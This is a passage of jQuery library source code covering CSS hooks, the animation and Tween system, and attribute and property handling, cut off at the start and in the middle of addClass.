						value += ret && ret[ 3 ] || ( jQuery.cssNumber[ origName ] ? "" : "px" );
					}

					// background-* props affect original clone's values
					if ( !support.clearCloneStyle && value === "" && name.indexOf( "background" ) === 0 ) {
						style[ name ] = "inherit";
					}

					// If a hook was provided, use that value, otherwise just set the specified value
					if ( !hooks || !( "set" in hooks ) ||
						( value = hooks.set( elem, value, extra ) ) !== undefined ) {

						if ( isCustomProp ) {
							style.setProperty( name, value );
						} else {
							style[ name ] = value;
						}
					}

				} else {

					// If a hook was provided get the non-computed value from there
					if ( hooks && "get" in hooks &&
						( ret = hooks.get( elem, false, extra ) ) !== undefined ) {

						return ret;
					}

					// Otherwise just get the value from the style object
					return style[ name ];
				}
			},

			css: function( elem, name, extra, styles ) {
				var val, num, hooks,
					origName = camelCase( name ),
					isCustomProp = rcustomProp.test( name );

				// Make sure that we're working with the right name. We don't
				// want to modify the value if it is a CSS custom property
				// since they are user-defined.
				if ( !isCustomProp ) {
					name = finalPropName( origName );
				}

				// Try prefixed name followed by the unprefixed name
				hooks = jQuery.cssHooks[ name ] || jQuery.cssHooks[ origName ];

				// If a hook was provided get the computed value from there
				if ( hooks && "get" in hooks ) {
					val = hooks.get( elem, true, extra );
				}

				// Otherwise, if a way to get the computed value exists, use that
				if ( val === undefined ) {
					val = curCSS( elem, name, styles );
				}

				// Convert "normal" to computed value
				if ( val === "normal" && name in cssNormalTransform ) {
					val = cssNormalTransform[ name ];
				}

				// Make numeric if forced or a qualifier was provided and val looks numeric
				if ( extra === "" || extra ) {
					num = parseFloat( val );
					return extra === true || isFinite( num ) ? num || 0 : val;
				}

				return val;
			}
		} );

		jQuery.each( [ "height", "width" ], function( _i, dimension ) {
			jQuery.cssHooks[ dimension ] = {
				get: function( elem, computed, extra ) {
					if ( computed ) {

						// Certain elements can have dimension info if we invisibly show them
						// but it must have a current display style that would benefit
						return rdisplayswap.test( jQuery.css( elem, "display" ) ) &&

							// Support: Safari 8+
							// Table columns in Safari have non-zero offsetWidth & zero
							// getBoundingClientRect().width unless display is changed.
							// Support: IE <=11 only
							// Running getBoundingClientRect on a disconnected node
							// in IE throws an error.
							( !elem.getClientRects().length || !elem.getBoundingClientRect().width ) ?
							swap( elem, cssShow, function() {
								return getWidthOrHeight( elem, dimension, extra );
							} ) :
							getWidthOrHeight( elem, dimension, extra );
					}
				},

				set: function( elem, value, extra ) {
					var matches,
						styles = getStyles( elem ),

						// Only read styles.position if the test has a chance to fail
						// to avoid forcing a reflow.
						scrollboxSizeBuggy = !support.scrollboxSize() &&
							styles.position === "absolute",

						// To avoid forcing a reflow, only fetch boxSizing if we need it (gh-3991)
						boxSizingNeeded = scrollboxSizeBuggy || extra,
						isBorderBox = boxSizingNeeded &&
							jQuery.css( elem, "boxSizing", false, styles ) === "border-box",
						subtract = extra ?
							boxModelAdjustment(
								elem,
								dimension,
								extra,
								isBorderBox,
								styles
							) :
							0;

					// Account for unreliable border-box dimensions by comparing offset* to computed and
					// faking a content-box to get border and padding (gh-3699)
					if ( isBorderBox && scrollboxSizeBuggy ) {
						subtract -= Math.ceil(
							elem[ "offset" + dimension[ 0 ].toUpperCase() + dimension.slice( 1 ) ] -
							parseFloat( styles[ dimension ] ) -
							boxModelAdjustment( elem, dimension, "border", false, styles ) -
							0.5
						);
					}

					// Convert to pixels if value adjustment is needed
					if ( subtract && ( matches = rcssNum.exec( value ) ) &&
						( matches[ 3 ] || "px" ) !== "px" ) {

						elem.style[ dimension ] = value;
						value = jQuery.css( elem, dimension );
					}

					return setPositiveNumber( elem, value, subtract );
				}
			};
		} );

		jQuery.cssHooks.marginLeft = addGetHookIf( support.reliableMarginLeft,
			function( elem, computed ) {
				if ( computed ) {
					return ( parseFloat( curCSS( elem, "marginLeft" ) ) ||
						elem.getBoundingClientRect().left -
							swap( elem, { marginLeft: 0 }, function() {
								return elem.getBoundingClientRect().left;
							} )
					) + "px";
				}
			}
		);

		// These hooks are used by animate to expand properties
		jQuery.each( {
			margin: "",
			padding: "",
			border: "Width"
		}, function( prefix, suffix ) {
			jQuery.cssHooks[ prefix + suffix ] = {
				expand: function( value ) {
					var i = 0,
						expanded = {},

						// Assumes a single number if not a string
						parts = typeof value === "string" ? value.split( " " ) : [ value ];

					for ( ; i < 4; i++ ) {
						expanded[ prefix + cssExpand[ i ] + suffix ] =
							parts[ i ] || parts[ i - 2 ] || parts[ 0 ];
					}

					return expanded;
				}
			};

			if ( prefix !== "margin" ) {
				jQuery.cssHooks[ prefix + suffix ].set = setPositiveNumber;
			}
		} );

		jQuery.fn.extend( {
			css: function( name, value ) {
				return access( this, function( elem, name, value ) {
					var styles, len,
						map = {},
						i = 0;

					if ( Array.isArray( name ) ) {
						styles = getStyles( elem );
						len = name.length;

						for ( ; i < len; i++ ) {
							map[ name[ i ] ] = jQuery.css( elem, name[ i ], false, styles );
						}

						return map;
					}

					return value !== undefined ?
						jQuery.style( elem, name, value ) :
						jQuery.css( elem, name );
				}, name, value, arguments.length > 1 );
			}
		} );


		function Tween( elem, options, prop, end, easing ) {
			return new Tween.prototype.init( elem, options, prop, end, easing );
		}
		jQuery.Tween = Tween;

		Tween.prototype = {
			constructor: Tween,
			init: function( elem, options, prop, end, easing, unit ) {
				this.elem = elem;
				this.prop = prop;
				this.easing = easing || jQuery.easing._default;
				this.options = options;
				this.start = this.now = this.cur();
				this.end = end;
				this.unit = unit || ( jQuery.cssNumber[ prop ] ? "" : "px" );
			},
			cur: function() {
				var hooks = Tween.propHooks[ this.prop ];

				return hooks && hooks.get ?
					hooks.get( this ) :
					Tween.propHooks._default.get( this );
			},
			run: function( percent ) {
				var eased,
					hooks = Tween.propHooks[ this.prop ];

				if ( this.options.duration ) {
					this.pos = eased = jQuery.easing[ this.easing ](
						percent, this.options.duration * percent, 0, 1, this.options.duration
					);
				} else {
					this.pos = eased = percent;
				}
				this.now = ( this.end - this.start ) * eased + this.start;

				if ( this.options.step ) {
					this.options.step.call( this.elem, this.now, this );
				}

				if ( hooks && hooks.set ) {
					hooks.set( this );
				} else {
					Tween.propHooks._default.set( this );
				}
				return this;
			}
		};

		Tween.prototype.init.prototype = Tween.prototype;

		Tween.propHooks = {
			_default: {
				get: function( tween ) {
					var result;

					// Use a property on the element directly when it is not a DOM element,
					// or when there is no matching style property that exists.
					if ( tween.elem.nodeType !== 1 ||
						tween.elem[ tween.prop ] != null && tween.elem.style[ tween.prop ] == null ) {
						return tween.elem[ tween.prop ];
					}

					// Passing an empty string as a 3rd parameter to .css will automatically
					// attempt a parseFloat and fallback to a string if the parse fails.
					// Simple values such as "10px" are parsed to Float;
					// complex values such as "rotate(1rad)" are returned as-is.
					result = jQuery.css( tween.elem, tween.prop, "" );

					// Empty strings, null, undefined and "auto" are converted to 0.
					return !result || result === "auto" ? 0 : result;
				},
				set: function( tween ) {

					// Use step hook for back compat.
					// Use cssHook if its there.
					// Use .style if available and use plain properties where available.
					if ( jQuery.fx.step[ tween.prop ] ) {
						jQuery.fx.step[ tween.prop ]( tween );
					} else if ( tween.elem.nodeType === 1 && (
						jQuery.cssHooks[ tween.prop ] ||
							tween.elem.style[ finalPropName( tween.prop ) ] != null ) ) {
						jQuery.style( tween.elem, tween.prop, tween.now + tween.unit );
					} else {
						tween.elem[ tween.prop ] = tween.now;
					}
				}
			}
		};

		// Support: IE <=9 only
		// Panic based approach to setting things on disconnected nodes
		Tween.propHooks.scrollTop = Tween.propHooks.scrollLeft = {
			set: function( tween ) {
				if ( tween.elem.nodeType && tween.elem.parentNode ) {
					tween.elem[ tween.prop ] = tween.now;
				}
			}
		};

		jQuery.easing = {
			linear: function( p ) {
				return p;
			},
			swing: function( p ) {
				return 0.5 - Math.cos( p * Math.PI ) / 2;
			},
			_default: "swing"
		};

		jQuery.fx = Tween.prototype.init;

		// Back compat <1.8 extension point
		jQuery.fx.step = {};




		var
			fxNow, inProgress,
			rfxtypes = /^(?:toggle|show|hide)$/,
			rrun = /queueHooks$/;

		function schedule() {
			if ( inProgress ) {
				if ( document.hidden === false && window.requestAnimationFrame ) {
					window.requestAnimationFrame( schedule );
				} else {
					window.setTimeout( schedule, jQuery.fx.interval );
				}

				jQuery.fx.tick();
			}
		}

		// Animations created synchronously will run synchronously
		function createFxNow() {
			window.setTimeout( function() {
				fxNow = undefined;
			} );
			return ( fxNow = Date.now() );
		}

		// Generate parameters to create a standard animation
		function genFx( type, includeWidth ) {
			var which,
				i = 0,
				attrs = { height: type };

			// If we include width, step value is 1 to do all cssExpand values,
			// otherwise step value is 2 to skip over Left and Right
			includeWidth = includeWidth ? 1 : 0;
			for ( ; i < 4; i += 2 - includeWidth ) {
				which = cssExpand[ i ];
				attrs[ "margin" + which ] = attrs[ "padding" + which ] = type;
			}

			if ( includeWidth ) {
				attrs.opacity = attrs.width = type;
			}

			return attrs;
		}

		function createTween( value, prop, animation ) {
			var tween,
				collection = ( Animation.tweeners[ prop ] || [] ).concat( Animation.tweeners[ "*" ] ),
				index = 0,
				length = collection.length;
			for ( ; index < length; index++ ) {
				if ( ( tween = collection[ index ].call( animation, prop, value ) ) ) {

					// We're done with this property
					return tween;
				}
			}
		}

		function defaultPrefilter( elem, props, opts ) {
			var prop, value, toggle, hooks, oldfire, propTween, restoreDisplay, display,
				isBox = "width" in props || "height" in props,
				anim = this,
				orig = {},
				style = elem.style,
				hidden = elem.nodeType && isHiddenWithinTree( elem ),
				dataShow = dataPriv.get( elem, "fxshow" );

			// Queue-skipping animations hijack the fx hooks
			if ( !opts.queue ) {
				hooks = jQuery._queueHooks( elem, "fx" );
				if ( hooks.unqueued == null ) {
					hooks.unqueued = 0;
					oldfire = hooks.empty.fire;
					hooks.empty.fire = function() {
						if ( !hooks.unqueued ) {
							oldfire();
						}
					};
				}
				hooks.unqueued++;

				anim.always( function() {

					// Ensure the complete handler is called before this completes
					anim.always( function() {
						hooks.unqueued--;
						if ( !jQuery.queue( elem, "fx" ).length ) {
							hooks.empty.fire();
						}
					} );
				} );
			}

			// Detect show/hide animations
			for ( prop in props ) {
				value = props[ prop ];
				if ( rfxtypes.test( value ) ) {
					delete props[ prop ];
					toggle = toggle || value === "toggle";
					if ( value === ( hidden ? "hide" : "show" ) ) {

						// Pretend to be hidden if this is a "show" and
						// there is still data from a stopped show/hide
						if ( value === "show" && dataShow && dataShow[ prop ] !== undefined ) {
							hidden = true;

						// Ignore all other no-op show/hide data
						} else {
							continue;
						}
					}
					orig[ prop ] = dataShow && dataShow[ prop ] || jQuery.style( elem, prop );
				}
			}

			// Bail out if this is a no-op like .hide().hide()
			propTween = !jQuery.isEmptyObject( props );
			if ( !propTween && jQuery.isEmptyObject( orig ) ) {
				return;
			}

			// Restrict "overflow" and "display" styles during box animations
			if ( isBox && elem.nodeType === 1 ) {

				// Support: IE <=9 - 11, Edge 12 - 15
				// Record all 3 overflow attributes because IE does not infer the shorthand
				// from identically-valued overflowX and overflowY and Edge just mirrors
				// the overflowX value there.
				opts.overflow = [ style.overflow, style.overflowX, style.overflowY ];

				// Identify a display type, preferring old show/hide data over the CSS cascade
				restoreDisplay = dataShow && dataShow.display;
				if ( restoreDisplay == null ) {
					restoreDisplay = dataPriv.get( elem, "display" );
				}
				display = jQuery.css( elem, "display" );
				if ( display === "none" ) {
					if ( restoreDisplay ) {
						display = restoreDisplay;
					} else {

						// Get nonempty value(s) by temporarily forcing visibility
						showHide( [ elem ], true );
						restoreDisplay = elem.style.display || restoreDisplay;
						display = jQuery.css( elem, "display" );
						showHide( [ elem ] );
					}
				}

				// Animate inline elements as inline-block
				if ( display === "inline" || display === "inline-block" && restoreDisplay != null ) {
					if ( jQuery.css( elem, "float" ) === "none" ) {

						// Restore the original display value at the end of pure show/hide animations
						if ( !propTween ) {
							anim.done( function() {
								style.display = restoreDisplay;
							} );
							if ( restoreDisplay == null ) {
								display = style.display;
								restoreDisplay = display === "none" ? "" : display;
							}
						}
						style.display = "inline-block";
					}
				}
			}

			if ( opts.overflow ) {
				style.overflow = "hidden";
				anim.always( function() {
					style.overflow = opts.overflow[ 0 ];
					style.overflowX = opts.overflow[ 1 ];
					style.overflowY = opts.overflow[ 2 ];
				} );
			}

			// Implement show/hide animations
			propTween = false;
			for ( prop in orig ) {

				// General show/hide setup for this element animation
				if ( !propTween ) {
					if ( dataShow ) {
						if ( "hidden" in dataShow ) {
							hidden = dataShow.hidden;
						}
					} else {
						dataShow = dataPriv.access( elem, "fxshow", { display: restoreDisplay } );
					}

					// Store hidden/visible for toggle so `.stop().toggle()` "reverses"
					if ( toggle ) {
						dataShow.hidden = !hidden;
					}

					// Show elements before animating them
					if ( hidden ) {
						showHide( [ elem ], true );
					}

					/* eslint-disable no-loop-func */

					anim.done( function() {

						/* eslint-enable no-loop-func */

						// The final step of a "hide" animation is actually hiding the element
						if ( !hidden ) {
							showHide( [ elem ] );
						}
						dataPriv.remove( elem, "fxshow" );
						for ( prop in orig ) {
							jQuery.style( elem, prop, orig[ prop ] );
						}
					} );
				}

				// Per-property setup
				propTween = createTween( hidden ? dataShow[ prop ] : 0, prop, anim );
				if ( !( prop in dataShow ) ) {
					dataShow[ prop ] = propTween.start;
					if ( hidden ) {
						propTween.end = propTween.start;
						propTween.start = 0;
					}
				}
			}
		}

		function propFilter( props, specialEasing ) {
			var index, name, easing, value, hooks;

			// camelCase, specialEasing and expand cssHook pass
			for ( index in props ) {
				name = camelCase( index );
				easing = specialEasing[ name ];
				value = props[ index ];
				if ( Array.isArray( value ) ) {
					easing = value[ 1 ];
					value = props[ index ] = value[ 0 ];
				}

				if ( index !== name ) {
					props[ name ] = value;
					delete props[ index ];
				}

				hooks = jQuery.cssHooks[ name ];
				if ( hooks && "expand" in hooks ) {
					value = hooks.expand( value );
					delete props[ name ];

					// Not quite $.extend, this won't overwrite existing keys.
					// Reusing 'index' because we have the correct "name"
					for ( index in value ) {
						if ( !( index in props ) ) {
							props[ index ] = value[ index ];
							specialEasing[ index ] = easing;
						}
					}
				} else {
					specialEasing[ name ] = easing;
				}
			}
		}

		function Animation( elem, properties, options ) {
			var result,
				stopped,
				index = 0,
				length = Animation.prefilters.length,
				deferred = jQuery.Deferred().always( function() {

					// Don't match elem in the :animated selector
					delete tick.elem;
				} ),
				tick = function() {
					if ( stopped ) {
						return false;
					}
					var currentTime = fxNow || createFxNow(),
						remaining = Math.max( 0, animation.startTime + animation.duration - currentTime ),

						// Support: Android 2.3 only
						// Archaic crash bug won't allow us to use `1 - ( 0.5 || 0 )` (trac-12497)
						temp = remaining / animation.duration || 0,
						percent = 1 - temp,
						index = 0,
						length = animation.tweens.length;

					for ( ; index < length; index++ ) {
						animation.tweens[ index ].run( percent );
					}

					deferred.notifyWith( elem, [ animation, percent, remaining ] );

					// If there's more to do, yield
					if ( percent < 1 && length ) {
						return remaining;
					}

					// If this was an empty animation, synthesize a final progress notification
					if ( !length ) {
						deferred.notifyWith( elem, [ animation, 1, 0 ] );
					}

					// Resolve the animation and report its conclusion
					deferred.resolveWith( elem, [ animation ] );
					return false;
				},
				animation = deferred.promise( {
					elem: elem,
					props: jQuery.extend( {}, properties ),
					opts: jQuery.extend( true, {
						specialEasing: {},
						easing: jQuery.easing._default
					}, options ),
					originalProperties: properties,
					originalOptions: options,
					startTime: fxNow || createFxNow(),
					duration: options.duration,
					tweens: [],
					createTween: function( prop, end ) {
						var tween = jQuery.Tween( elem, animation.opts, prop, end,
							animation.opts.specialEasing[ prop ] || animation.opts.easing );
						animation.tweens.push( tween );
						return tween;
					},
					stop: function( gotoEnd ) {
						var index = 0,

							// If we are going to the end, we want to run all the tweens
							// otherwise we skip this part
							length = gotoEnd ? animation.tweens.length : 0;
						if ( stopped ) {
							return this;
						}
						stopped = true;
						for ( ; index < length; index++ ) {
							animation.tweens[ index ].run( 1 );
						}

						// Resolve when we played the last frame; otherwise, reject
						if ( gotoEnd ) {
							deferred.notifyWith( elem, [ animation, 1, 0 ] );
							deferred.resolveWith( elem, [ animation, gotoEnd ] );
						} else {
							deferred.rejectWith( elem, [ animation, gotoEnd ] );
						}
						return this;
					}
				} ),
				props = animation.props;

			propFilter( props, animation.opts.specialEasing );

			for ( ; index < length; index++ ) {
				result = Animation.prefilters[ index ].call( animation, elem, props, animation.opts );
				if ( result ) {
					if ( isFunction( result.stop ) ) {
						jQuery._queueHooks( animation.elem, animation.opts.queue ).stop =
							result.stop.bind( result );
					}
					return result;
				}
			}

			jQuery.map( props, createTween, animation );

			if ( isFunction( animation.opts.start ) ) {
				animation.opts.start.call( elem, animation );
			}

			// Attach callbacks from options
			animation
				.progress( animation.opts.progress )
				.done( animation.opts.done, animation.opts.complete )
				.fail( animation.opts.fail )
				.always( animation.opts.always );

			jQuery.fx.timer(
				jQuery.extend( tick, {
					elem: elem,
					anim: animation,
					queue: animation.opts.queue
				} )
			);

			return animation;
		}

		jQuery.Animation = jQuery.extend( Animation, {

			tweeners: {
				"*": [ function( prop, value ) {
					var tween = this.createTween( prop, value );
					adjustCSS( tween.elem, prop, rcssNum.exec( value ), tween );
					return tween;
				} ]
			},

			tweener: function( props, callback ) {
				if ( isFunction( props ) ) {
					callback = props;
					props = [ "*" ];
				} else {
					props = props.match( rnothtmlwhite );
				}

				var prop,
					index = 0,
					length = props.length;

				for ( ; index < length; index++ ) {
					prop = props[ index ];
					Animation.tweeners[ prop ] = Animation.tweeners[ prop ] || [];
					Animation.tweeners[ prop ].unshift( callback );
				}
			},

			prefilters: [ defaultPrefilter ],

			prefilter: function( callback, prepend ) {
				if ( prepend ) {
					Animation.prefilters.unshift( callback );
				} else {
					Animation.prefilters.push( callback );
				}
			}
		} );

		jQuery.speed = function( speed, easing, fn ) {
			var opt = speed && typeof speed === "object" ? jQuery.extend( {}, speed ) : {
				complete: fn || !fn && easing ||
					isFunction( speed ) && speed,
				duration: speed,
				easing: fn && easing || easing && !isFunction( easing ) && easing
			};

			// Go to the end state if fx are off
			if ( jQuery.fx.off ) {
				opt.duration = 0;

			} else {
				if ( typeof opt.duration !== "number" ) {
					if ( opt.duration in jQuery.fx.speeds ) {
						opt.duration = jQuery.fx.speeds[ opt.duration ];

					} else {
						opt.duration = jQuery.fx.speeds._default;
					}
				}
			}

			// Normalize opt.queue - true/undefined/null -> "fx"
			if ( opt.queue == null || opt.queue === true ) {
				opt.queue = "fx";
			}

			// Queueing
			opt.old = opt.complete;

			opt.complete = function() {
				if ( isFunction( opt.old ) ) {
					opt.old.call( this );
				}

				if ( opt.queue ) {
					jQuery.dequeue( this, opt.queue );
				}
			};

			return opt;
		};

		jQuery.fn.extend( {
			fadeTo: function( speed, to, easing, callback ) {

				// Show any hidden elements after setting opacity to 0
				return this.filter( isHiddenWithinTree ).css( "opacity", 0 ).show()

					// Animate to the value specified
					.end().animate( { opacity: to }, speed, easing, callback );
			},
			animate: function( prop, speed, easing, callback ) {
				var empty = jQuery.isEmptyObject( prop ),
					optall = jQuery.speed( speed, easing, callback ),
					doAnimation = function() {

						// Operate on a copy of prop so per-property easing won't be lost
						var anim = Animation( this, jQuery.extend( {}, prop ), optall );

						// Empty animations, or finishing resolves immediately
						if ( empty || dataPriv.get( this, "finish" ) ) {
							anim.stop( true );
						}
					};

				doAnimation.finish = doAnimation;

				return empty || optall.queue === false ?
					this.each( doAnimation ) :
					this.queue( optall.queue, doAnimation );
			},
			stop: function( type, clearQueue, gotoEnd ) {
				var stopQueue = function( hooks ) {
					var stop = hooks.stop;
					delete hooks.stop;
					stop( gotoEnd );
				};

				if ( typeof type !== "string" ) {
					gotoEnd = clearQueue;
					clearQueue = type;
					type = undefined;
				}
				if ( clearQueue ) {
					this.queue( type || "fx", [] );
				}

				return this.each( function() {
					var dequeue = true,
						index = type != null && type + "queueHooks",
						timers = jQuery.timers,
						data = dataPriv.get( this );

					if ( index ) {
						if ( data[ index ] && data[ index ].stop ) {
							stopQueue( data[ index ] );
						}
					} else {
						for ( index in data ) {
							if ( data[ index ] && data[ index ].stop && rrun.test( index ) ) {
								stopQueue( data[ index ] );
							}
						}
					}

					for ( index = timers.length; index--; ) {
						if ( timers[ index ].elem === this &&
							( type == null || timers[ index ].queue === type ) ) {

							timers[ index ].anim.stop( gotoEnd );
							dequeue = false;
							timers.splice( index, 1 );
						}
					}

					// Start the next in the queue if the last step wasn't forced.
					// Timers currently will call their complete callbacks, which
					// will dequeue but only if they were gotoEnd.
					if ( dequeue || !gotoEnd ) {
						jQuery.dequeue( this, type );
					}
				} );
			},
			finish: function( type ) {
				if ( type !== false ) {
					type = type || "fx";
				}
				return this.each( function() {
					var index,
						data = dataPriv.get( this ),
						queue = data[ type + "queue" ],
						hooks = data[ type + "queueHooks" ],
						timers = jQuery.timers,
						length = queue ? queue.length : 0;

					// Enable finishing flag on private data
					data.finish = true;

					// Empty the queue first
					jQuery.queue( this, type, [] );

					if ( hooks && hooks.stop ) {
						hooks.stop.call( this, true );
					}

					// Look for any active animations, and finish them
					for ( index = timers.length; index--; ) {
						if ( timers[ index ].elem === this && timers[ index ].queue === type ) {
							timers[ index ].anim.stop( true );
							timers.splice( index, 1 );
						}
					}

					// Look for any animations in the old queue and finish them
					for ( index = 0; index < length; index++ ) {
						if ( queue[ index ] && queue[ index ].finish ) {
							queue[ index ].finish.call( this );
						}
					}

					// Turn off finishing flag
					delete data.finish;
				} );
			}
		} );

		jQuery.each( [ "toggle", "show", "hide" ], function( _i, name ) {
			var cssFn = jQuery.fn[ name ];
			jQuery.fn[ name ] = function( speed, easing, callback ) {
				return speed == null || typeof speed === "boolean" ?
					cssFn.apply( this, arguments ) :
					this.animate( genFx( name, true ), speed, easing, callback );
			};
		} );

		// Generate shortcuts for custom animations
		jQuery.each( {
			slideDown: genFx( "show" ),
			slideUp: genFx( "hide" ),
			slideToggle: genFx( "toggle" ),
			fadeIn: { opacity: "show" },
			fadeOut: { opacity: "hide" },
			fadeToggle: { opacity: "toggle" }
		}, function( name, props ) {
			jQuery.fn[ name ] = function( speed, easing, callback ) {
				return this.animate( props, speed, easing, callback );
			};
		} );

		jQuery.timers = [];
		jQuery.fx.tick = function() {
			var timer,
				i = 0,
				timers = jQuery.timers;

			fxNow = Date.now();

			for ( ; i < timers.length; i++ ) {
				timer = timers[ i ];

				// Run the timer and safely remove it when done (allowing for external removal)
				if ( !timer() && timers[ i ] === timer ) {
					timers.splice( i--, 1 );
				}
			}

			if ( !timers.length ) {
				jQuery.fx.stop();
			}
			fxNow = undefined;
		};

		jQuery.fx.timer = function( timer ) {
			jQuery.timers.push( timer );
			jQuery.fx.start();
		};

		jQuery.fx.interval = 13;
		jQuery.fx.start = function() {
			if ( inProgress ) {
				return;
			}

			inProgress = true;
			schedule();
		};

		jQuery.fx.stop = function() {
			inProgress = null;
		};

		jQuery.fx.speeds = {
			slow: 600,
			fast: 200,

			// Default speed
			_default: 400
		};


		// Based off of the plugin by Clint Helfers, with permission.
		jQuery.fn.delay = function( time, type ) {
			time = jQuery.fx ? jQuery.fx.speeds[ time ] || time : time;
			type = type || "fx";

			return this.queue( type, function( next, hooks ) {
				var timeout = window.setTimeout( next, time );
				hooks.stop = function() {
					window.clearTimeout( timeout );
				};
			} );
		};


		( function() {
			var input = document.createElement( "input" ),
				select = document.createElement( "select" ),
				opt = select.appendChild( document.createElement( "option" ) );

			input.type = "checkbox";

			// Support: Android <=4.3 only
			// Default value for a checkbox should be "on"
			support.checkOn = input.value !== "";

			// Support: IE <=11 only
			// Must access selectedIndex to make default options select
			support.optSelected = opt.selected;

			// Support: IE <=11 only
			// An input loses its value after becoming a radio
			input = document.createElement( "input" );
			input.value = "t";
			input.type = "radio";
			support.radioValue = input.value === "t";
		} )();


		var boolHook,
			attrHandle = jQuery.expr.attrHandle;

		jQuery.fn.extend( {
			attr: function( name, value ) {
				return access( this, jQuery.attr, name, value, arguments.length > 1 );
			},

			removeAttr: function( name ) {
				return this.each( function() {
					jQuery.removeAttr( this, name );
				} );
			}
		} );

		jQuery.extend( {
			attr: function( elem, name, value ) {
				var ret, hooks,
					nType = elem.nodeType;

				// Don't get/set attributes on text, comment and attribute nodes
				if ( nType === 3 || nType === 8 || nType === 2 ) {
					return;
				}

				// Fallback to prop when attributes are not supported
				if ( typeof elem.getAttribute === "undefined" ) {
					return jQuery.prop( elem, name, value );
				}

				// Attribute hooks are determined by the lowercase version
				// Grab necessary hook if one is defined
				if ( nType !== 1 || !jQuery.isXMLDoc( elem ) ) {
					hooks = jQuery.attrHooks[ name.toLowerCase() ] ||
						( jQuery.expr.match.bool.test( name ) ? boolHook : undefined );
				}

				if ( value !== undefined ) {
					if ( value === null ) {
						jQuery.removeAttr( elem, name );
						return;
					}

					if ( hooks && "set" in hooks &&
						( ret = hooks.set( elem, value, name ) ) !== undefined ) {
						return ret;
					}

					elem.setAttribute( name, value + "" );
					return value;
				}

				if ( hooks && "get" in hooks && ( ret = hooks.get( elem, name ) ) !== null ) {
					return ret;
				}

				ret = jQuery.find.attr( elem, name );

				// Non-existent attributes return null, we normalize to undefined
				return ret == null ? undefined : ret;
			},

			attrHooks: {
				type: {
					set: function( elem, value ) {
						if ( !support.radioValue && value === "radio" &&
							nodeName( elem, "input" ) ) {
							var val = elem.value;
							elem.setAttribute( "type", value );
							if ( val ) {
								elem.value = val;
							}
							return value;
						}
					}
				}
			},

			removeAttr: function( elem, value ) {
				var name,
					i = 0,

					// Attribute names can contain non-HTML whitespace characters
					// https://html.spec.whatwg.org/multipage/syntax.html#attributes-2
					attrNames = value && value.match( rnothtmlwhite );

				if ( attrNames && elem.nodeType === 1 ) {
					while ( ( name = attrNames[ i++ ] ) ) {
						elem.removeAttribute( name );
					}
				}
			}
		} );

		// Hooks for boolean attributes
		boolHook = {
			set: function( elem, value, name ) {
				if ( value === false ) {

					// Remove boolean attributes when set to false
					jQuery.removeAttr( elem, name );
				} else {
					elem.setAttribute( name, name );
				}
				return name;
			}
		};

		jQuery.each( jQuery.expr.match.bool.source.match( /\w+/g ), function( _i, name ) {
			var getter = attrHandle[ name ] || jQuery.find.attr;

			attrHandle[ name ] = function( elem, name, isXML ) {
				var ret, handle,
					lowercaseName = name.toLowerCase();

				if ( !isXML ) {

					// Avoid an infinite loop by temporarily removing this function from the getter
					handle = attrHandle[ lowercaseName ];
					attrHandle[ lowercaseName ] = ret;
					ret = getter( elem, name, isXML ) != null ?
						lowercaseName :
						null;
					attrHandle[ lowercaseName ] = handle;
				}
				return ret;
			};
		} );




		var rfocusable = /^(?:input|select|textarea|button)$/i,
			rclickable = /^(?:a|area)$/i;

		jQuery.fn.extend( {
			prop: function( name, value ) {
				return access( this, jQuery.prop, name, value, arguments.length > 1 );
			},

			removeProp: function( name ) {
				return this.each( function() {
					delete this[ jQuery.propFix[ name ] || name ];
				} );
			}
		} );

		jQuery.extend( {
			prop: function( elem, name, value ) {
				var ret, hooks,
					nType = elem.nodeType;

				// Don't get/set properties on text, comment and attribute nodes
				if ( nType === 3 || nType === 8 || nType === 2 ) {
					return;
				}

				if ( nType !== 1 || !jQuery.isXMLDoc( elem ) ) {

					// Fix name and attach hooks
					name = jQuery.propFix[ name ] || name;
					hooks = jQuery.propHooks[ name ];
				}

				if ( value !== undefined ) {
					if ( hooks && "set" in hooks &&
						( ret = hooks.set( elem, value, name ) ) !== undefined ) {
						return ret;
					}

					return ( elem[ name ] = value );
				}

				if ( hooks && "get" in hooks && ( ret = hooks.get( elem, name ) ) !== null ) {
					return ret;
				}

				return elem[ name ];
			},

			propHooks: {
				tabIndex: {
					get: function( elem ) {

						// Support: IE <=9 - 11 only
						// elem.tabIndex doesn't always return the
						// correct value when it hasn't been explicitly set
						// Use proper attribute retrieval (trac-12072)
						var tabindex = jQuery.find.attr( elem, "tabindex" );

						if ( tabindex ) {
							return parseInt( tabindex, 10 );
						}

						if (
							rfocusable.test( elem.nodeName ) ||
							rclickable.test( elem.nodeName ) &&
							elem.href
						) {
							return 0;
						}

						return -1;
					}
				}
			},

			propFix: {
				"for": "htmlFor",
				"class": "className"
			}
		} );

		// Support: IE <=11 only
		// Accessing the selectedIndex property
		// forces the browser to respect setting selected
		// on the option
		// The getter ensures a default option is selected
		// when in an optgroup
		// eslint rule "no-unused-expressions" is disabled for this code
		// since it considers such accessions noop
		if ( !support.optSelected ) {
			jQuery.propHooks.selected = {
				get: function( elem ) {

					/* eslint no-unused-expressions: "off" */

					var parent = elem.parentNode;
					if ( parent && parent.parentNode ) {
						parent.parentNode.selectedIndex;
					}
					return null;
				},
				set: function( elem ) {

					/* eslint no-unused-expressions: "off" */

					var parent = elem.parentNode;
					if ( parent ) {
						parent.selectedIndex;

						if ( parent.parentNode ) {
							parent.parentNode.selectedIndex;
						}
					}
				}
			};
		}

		jQuery.each( [
			"tabIndex",
			"readOnly",
			"maxLength",
			"cellSpacing",
			"cellPadding",
			"rowSpan",
			"colSpan",
			"useMap",
			"frameBorder",
			"contentEditable"
		], function() {
			jQuery.propFix[ this.toLowerCase() ] = this;
		} );




			// Strip and collapse whitespace according to HTML spec
			// https://infra.spec.whatwg.org/#strip-and-collapse-ascii-whitespace
			function stripAndCollapse( value ) {
				var tokens = value.match( rnothtmlwhite ) || [];
				return tokens.join( " " );
			}


		function getClass( elem ) {
			return elem.getAttribute && elem.getAttribute( "class" ) || "";
		}

		function classesToArray( value ) {
			if ( Array.isArray( value ) ) {
				return value;
			}
			if ( typeof value === "string" ) {
				return value.match( rnothtmlwhite ) || [];
			}
			return [];
		}

		jQuery.fn.extend( {
			addClass: function( value ) {
				var classNames, cur, curValue, className, i, finalValue;

				if ( isFunction( value ) ) {
					return this.each( function( j ) {
						jQuery( this ).addClass( value.call( this, j, getClass( this ) ) );
					} );
				}

				classNames = classesToArray( value );

				if ( classNames.length ) {
					return this.each( function() {
						curValue = getClass( this );
